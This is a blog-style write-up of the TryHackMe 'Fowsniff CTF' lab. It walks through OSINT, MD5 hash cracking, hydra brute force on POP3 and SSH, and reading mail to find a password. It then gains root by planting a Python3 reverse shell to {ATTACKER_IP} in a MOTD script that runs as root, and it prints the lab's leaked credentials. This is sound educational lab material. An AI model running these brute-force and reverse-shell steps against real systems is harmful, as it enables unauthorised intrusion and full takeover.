@@ -1,0 +1,347 @@
+---
+title: 'Fowsniff CTF'
+description: 'OSINT across Twitter and Pastebin, MD5 hash cracking, POP3/SSH brute force, manual mailbox reading and escalation via a startup script.'
+publishDate: 2026-09-03
+tags:
+  - cybersecurity
+  - tryhackme
+  - privesc
+---
+
+**Difficulty:** Easy **Category:** OSINT (Twitter/Pastebin), MD5 hash cracking, POP3/SSH brute force, manual mail enumeration (POP3), privilege escalation via a script run by root at login (`update-motd.d`) **Room:** [https://tryhackme.com/room/fowsniffer](https://tryhackme.com/room/fowsniffer)
+
+## Room description
+
+A Linux machine with a **real data-breach** narrative: the fictional company “Fowsniff Corp” suffered a hack of its Twitter account, and the attacker posted a link to a dump of employee credentials (MD5 hashes) on Pastebin. The challenge consists of reconstructing that OSINT chain, cracking the leaked hashes, using them to access the machine’s own mail server (POP3), reading internal emails that reveal a temporary SSH password, logging in over SSH, and escalating privileges by abusing a script run by root at every login.
+
+> **Note on placeholders:** `{IP}` / `target` stands for the IP TryHackMe assigns (it changes on every deploy). `{ATTACKER_IP}` stands for the IP of the TryHackMe VPN interface (`tun0`), needed for the final reverse shell. The usernames, hashes and passwords shown are fixed on this machine, since they come from a data dump “frozen” as part of the room’s script.
+
+---
+
+## 1. Environment setup
+
+```bash
+mkdir -p fowsniff_ctf/{scans,content,scripts,loot,exploits} && cd fowsniff_ctf
+settarget {IP}
+```
+
+---
+
+## 2. Port scan
+
+```bash
+nmap -p- --open -T5 -v -n target -oG scans/initial-scan
+extractPorts scans/initial-scan
+```
+
+- `-p- --open`: scans all TCP ports and shows only the open ones.
+- `-T5 -v -n`: aggressive timing, verbose, no DNS resolution.
+- `-oG`: “grepable” output for `extractPorts`.
+
+**Expected ports:**
+
+| Port    | Service |
+| ------- | ------- |
+| 22/tcp  | SSH     |
+| 80/tcp  | HTTP    |
+| 110/tcp | POP3    |
+| 143/tcp | IMAP    |
+
+Finding **POP3 open** is this machine’s most important hint: it is a mail service rarely seen directly exposed, and it matches the narrative discovered in the next step.
+
+---
+
+## 3. Web recon and OSINT (a prior step not in these notes, but essential)
+
+Visiting `http://{IP}/`, the page shows a **security-breach notice**: Fowsniff Corp announces that its Twitter account was compromised by an attacker identified as `B1gN1nj4`, and that employee credentials were leaked.
+
+### 3.1 Investigate the mentioned Twitter account
+
+Searching for the `@fowsniffcorp` account (referenced in the site’s notice), several tweets posted by the attacker after the hack are found, including:
+
+- A link to a **Pastebin** with the full dump of employee credentials (MD5 hashes).
+- An additional tweet revealing that user **`stone`** is the company’s **sysadmin** (a relevant detail later, although his hash turns out to be the only one that cannot be cracked with the usual tools).
+- A confirmation that the **POP3 server is “completely open”** — the hint that connects directly to port 110 detected in the scan.
+
+### 3.2 The credential dump (Pastebin)
+
+The leaked pastebin contains a list of `user:md5_hash` pairs, similar to:
+
+```
+mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
+mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
+tegel@fowsniff:1dc352435fecca338acfd4be10984009
+baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
+seina@fowsniff:90dc16d47114aa13671c697fd506cf26
+stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
+mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
+parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
+sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
+```
+
+Along with a mocking message from the attacker noting that MD5 is a weak, insecure algorithm, implicitly inviting you to crack the hashes.
+
+---
+
+## 4. Cracking the leaked hashes
+
+Try all the hashes against [CrackStation](https://crackstation.net/) (fast and effective, since unsalted MD5 is trivially searchable in precomputed databases):
+
+The vast majority of the hashes crack successfully — **except `stone`'s** (the sysadmin), whose password turns out to be robust enough not to be in CrackStation’s databases. This is intentional in the room’s design: the sysadmin is the only one whose account is not compromised this way.
+
+---
+
+## 5. Prepare user and password files
+
+```bash
+nano users.txt
+# One username per line (mauer, mustikka, tegel, baksteen, seina, mursten, parede, sciana — stone is excluded)
+
+nano passwords.txt
+# One candidate password per line (the passwords already cracked in the previous step)
+```
+
+Since CrackStation already associates each hash with its plaintext password, in practice you could pair `user:password` directly without additional brute force — but using Hydra in `-L`/`-P` mode (trying all combinations) serves as extra confirmation and automates validation against the real service.
+
+---
+
+## 6. Brute force on POP3
+
+```bash
+hydra -L users.txt -P passwords.txt -f target pop3
+```
+
+- `-L users.txt`: list of users to try.
+- `-P passwords.txt`: list of passwords to try.
+- `-f`: stops the attack as soon as it finds the **first** valid combination (useful here, since the goal is only to show the service accepts the leaked credentials, not to enumerate all valid accounts).
+- `pop3`: target protocol.
+
+**Confirmed credentials:**
+
+```
+user: seina
+password: scoobydoo2
+```
+
+---
+
+## 7. Manual connection to POP3
+
+```bash
+telnet target 110
+```
+
+POP3 protocol commands (one per line, after connecting):
+
+```
+USER seina
+PASS scoobydoo2
+```
+
+- `USER`: identifies the mail account name.
+- `PASS`: sends the associated password.
+
+### 7.1 List available emails
+
+```
+LIST
+```
+
+Shows the messages available in the mailbox, numbered (for example, `1` and `2`), along with their size in bytes.
+
+### 7.2 Read the emails
+
+```
+RETR 1
+```
+
+The first email reveals a **temporary SSH password**:
+
+```
+SSH -> passwd: S1ck3nBluff+secureshell
+```
+
+```
+RETR 2
+```
+
+The second email mentions another user, **`skyler`** (possible sender/recipient of the email), but provides no additional directly usable credentials — the real clue is in the sender/content of email 1, which lets you deduce which user that temporary password really belongs to (confirmed in the next step via targeted brute force).
+
+- `QUIT`: to close the POP3 session properly when done.
+
+---
+
+## 8. Identify which user the SSH password belongs to
+
+Since the obtained temporary password (`S1ck3nBluff+secureshell`) does not fully clarify which system account it corresponds to, use Hydra to try it against **all** known users (from the credential dump) on the SSH service:
+
+```bash
+hydra -L users.txt -p "S1ck3nBluff+secureshell" ssh://target
+```
+
+- `-L users.txt`: try the same password against the whole list of users.
+- `-p` (lowercase): a single fixed password (instead of `-P` with a file of many).
+
+**Confirmed credentials:**
+
+```
+user: baksteen
+password: S1ck3nBluff+secureshell
+```
+
+---
+
+## 9. SSH access
+
+```bash
+ssh-keygen -f '~/.ssh/known_hosts' -R 'target'
+```
+
+- Cleans any previous `known_hosts` entry associated with the host, avoiding “host key changed” warnings if the IP was reused by a different machine in a previous TryHackMe deploy.
+
+```bash
+ssh baksteen@target
+# password: S1ck3nBluff+secureshell
+```
+
+---
+
+## 10. Local enumeration — finding the escalation vector
+
+Once inside, check which **groups** the current user belongs to:
+
+```bash
+id
+groups
+```
+
+User `baksteen` belongs, among others, to a group called **`users`** (besides its primary group). This is a hint to look for files that this specific group can read/write/execute, beyond the “classic” owner permissions:
+
+```bash
+find / -group users -type f 2>/dev/null
+```
+
+- `-group users`: filters files whose **owning group** is exactly `users`.
+- `-type f`: regular files only (no directories).
+- `2>/dev/null`: discards error messages (for example, from directories with no read permission), leaving clean output.
+
+This command reveals a single relevant result:
+
+```
+/opt/cube/cube.sh
+```
+
+### 10.1 Analysing `cube.sh`
+
+```bash
+cat /opt/cube/cube.sh
+ls -la /opt/cube/cube.sh
+```
+
+The script, on inspection, turns out to be responsible for printing the **ASCII art of a cube** — the same banner/art shown automatically each time you log in over SSH on this machine. Its permissions confirm that the **`users` group has write permission** on the file, even though it runs with higher privileges.
+
+### 10.2 The mechanism that connects it to root: `update-motd.d`
+
+```bash
+ls -la /etc/update-motd.d/
+cat /etc/update-motd.d/00-header
+```
+
+On Debian/Ubuntu-based systems, the **`/etc/update-motd.d/`** directory contains a series of numbered scripts that run **automatically, as root**, each time a user logs in over SSH (through the PAM `pam_motd` module), to generate the dynamic “Message of the Day” (MOTD) shown right after login.
+
+One of those scripts (typically `00-header` or similar) is configured to in turn invoke `/opt/cube/cube.sh` as part of the banner-generation process — and since the whole MOTD mechanism runs with **root** privileges, anything `cube.sh` runs will also run as root.
+
+This connects the two findings perfectly: a file **writable by the `users` group** (`cube.sh`) that is **run as root** on every SSH login — the perfect combination for a trivial privilege escalation.
+
+---
+
+## 11. Exploitation
+
+### 11.1 Prepare the listener
+
+On the attacker machine:
+
+```bash
+nc -lvnp 1234
+```
+
+### 11.2 Modify `cube.sh`
+
+```bash
+nano /opt/cube/cube.sh
+```
+
+Add (or replace the content, depending on whether you want to keep the original ASCII art) the following line, a Python3 reverse shell:
+
+```python
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ATTACKER_IP}",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
+Breakdown of the one-liner:
+
+- `socket.socket(...)`: creates a TCP socket.
+- `s.connect(("{ATTACKER_IP}", 1234))`: connects to the attacker machine on the port where `nc` is listening.
+- `os.dup2(s.fileno(), 0/1/2)`: redirects the process’s standard input (0), standard output (1) and error output (2) to the socket — the same effect the Bash reverse shells on previous machines achieved, but implemented in pure Python (useful if `/bin/bash -i >& /dev/tcp/...` is not available, though here it is just the variant the exercise chose).
+- `subprocess.call(["/bin/sh", "-i"])`: launches an interactive shell whose input/output are already redirected to your socket.
+
+### 11.3 Trigger the execution
+
+It is enough to **close the current SSH session and reconnect**, since the MOTD (and therefore `cube.sh`) runs on every new login:
+
+```bash
+exit
+ssh baksteen@target
+```
+
+On reconnecting, the system runs `00-header` → `cube.sh` **as root**, firing the reverse shell toward your listener:
+
+```bash
+id
+# uid=0(root) gid=0(root) ...
+```
+
+> Note: depending on where in the script the Python line is inserted, the SSH login may get “frozen” waiting for the process to finish (since `cube.sh` runs synchronously before showing you the prompt) — this is normal and does not indicate an error; just check your `nc` listener, which should receive the connection at that very moment.
+
+---
+
+## 12. Capturing the flag
+
+```bash
+cat /root/flag.txt
+```
+
+---
+
+## 13. Attack chain summary
+
+1. **Recon** with `nmap` → SSH (22), HTTP (80), POP3 (110), IMAP (143).
+2. **OSINT** from the main site → discover the breach narrative and the compromised Twitter account `@fowsniffcorp`.
+3. **Leaked Pastebin**: dump of 9 `user:md5_hash` pairs.
+4. **Hash cracking** with CrackStation → recover 8 of 9 passwords (all except the sysadmin `stone`'s).
+5. **POP3 brute force** with `hydra` using the recovered credentials → `seina:scoobydoo2` confirmed against the real service.
+6. **Manual email reading** via `telnet` + POP3 commands (`USER`, `PASS`, `LIST`, `RETR`) → reveal a temporary SSH password.
+7. **Identify the correct user** for that password with `hydra` targeted against SSH → `baksteen:S1ck3nBluff+secureshell`.
+8. **SSH access** as `baksteen`.
+9. **Group enumeration** (`id`/`groups`) → membership in the `users` group.
+10. **File search by group** (`find / -group users -type f`) → discover `/opt/cube/cube.sh`, writable by that group.
+11. **Identify the privileged-execution mechanism**: `/etc/update-motd.d/` runs scripts as root on every SSH login, and one of them invokes `cube.sh`.
+12. **Inject a Python3 reverse shell** into `cube.sh`.
+13. **Trigger execution**: log out and reconnect over SSH → root shell.
+14. **Capture the final flag**.
+
+## 14. Lessons learned / key concepts
+
+- **OSINT as a real attack vector**: leaks from compromised social media, links to paste services (Pastebin) and credential-exposure slip-ups are an extremely common attack pattern in real incidents, not just in CTFs.
+- **Unsalted MD5 is trivially crackable** via precomputed databases (CrackStation), reinforcing why this algorithm has been considered unsuitable for storing passwords for over a decade.
+- **POP3 is a plaintext protocol** (unencrypted by default, unlike POP3S on port 995): credentials and email content travel unencrypted, and can be inspected manually with tools as simple as `telnet`.
+- **Password reuse across services** (the same leaked mail password also serving, in part, as a clue toward the SSH password) is one of the most common causes of cascading compromise in real environments.
+- **`/etc/update-motd.d/` as a privilege-escalation vector**: any script referenced from there runs as root on every SSH login; if one of those scripts (or something they invoke) is writable by an unprivileged user/group, it becomes an escalation path as simple as logging out and back in.
+- **`find / -group <group>`** is a less well-known privilege-enumeration technique than `find / -perm -4000` (SUID), but just as important: misconfigured group permissions can be as dangerous as misconfigured SUID permissions.
+
+## 15. Tools used
+
+`nmap`, a browser (OSINT: web, Twitter, Pastebin), CrackStation (MD5 cracking), `hydra`, `telnet` (manual POP3 client), `ssh-keygen`, the `ssh` client, `find`, `netcat`, `python3` (reverse shell).
+
+---
+
+_Academic write-up, built from my own notes solving the “Fowsniff CTF” machine on TryHackMe, supplemented with public community write-ups to reconstruct the full OSINT context (Twitter/Pastebin) and the exact privilege-escalation mechanism via `update-motd.d`._
